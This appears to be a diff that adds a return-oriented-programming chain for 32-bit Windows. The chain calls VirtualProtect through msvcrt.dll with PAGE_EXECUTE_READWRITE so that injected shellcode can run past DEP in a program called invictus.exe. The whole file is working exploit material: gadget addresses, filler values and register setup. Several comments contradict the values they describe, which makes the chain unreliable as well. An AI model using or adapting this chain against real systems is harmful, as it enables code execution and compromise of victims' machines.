@@ -1,0 +1,54 @@
+// --
+// function : VirtualProtect
+// module   : msvcrt.dll
+// size     : 148 bytes
+// --
+
+// edi = <shellcode>, recovery
+0x47a1d: push esp ; and al, 0x0C ; neg edx ; neg eax ; sbb edx, 0x00000000 ; mov ecx, edx ; mov edx, ebx ; mov ebx, ecx ; mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+0x13a1a: xchg eax, esi ; cmpsb ; ret
+[0x41414141]
+[0x41414141]
+[0x41414141]
+[0x41414141]
+0x0c0dd: pop ecx ; ret
+[0xffffff70] // -0x8c
+0x8867a: sub eax, ecx ; ret
+0x180b2: xchg eax, edi ; ret
+
+// ecx = (invictus.exe + 0xa004), lpflOldProtect = &invictus.data
+0x9627b: pop eax ; ret
+[invictus.exe + 0xa004]
+0x077ab: xchg eax, ecx ; mov edx, 0x653FB4A5 ; ret
+
+// edx = 0x40, flProtect = PAGE_EXECUTE_READWRITE
+0x9627b: pop eax ; ret
+[0x40]
+0x575c4: mov edx, eax ; mov eax, ecx ; pop ebp ; ret
+[0x41414141]
+
+// ebx = 0x200, dwSize = 0x200
+0x9627b: pop eax ; ret
+[0x80]
+0x178b6: xchg eax, ebx ; ret
+
+// esi = (invictus.dll + 0xb61ac), <function> = &(VirtualProtect)
+0x9627b: pop eax ; ret
+[msvcrt.dll + 0xb61ac]
+0x7681c: mov eax,  [eax] ; pop esi ; pop ebp ; ret
+[0x41414141]
+[0x41414141]
+0x13a1a: xchg eax, esi ; cmpsb ; ret
+0x4994e: dec esi ; ret
+0x793cd: dec edi ; or al, 0xF6 ; ret
+
+// ebp = edi, <return> = <shellcode>
+0x07db2: xchg eax, edi ; ret
+0x77532: xchg eax, ebp ; ret
+
+// edi = (msvcrt + 0x45d7f), <nop> = &(ret)
+0x45d7e: pop edi ; ret
+0x45d7f: ret
+
+// pushad
+0xa8a54: pushad ; ret
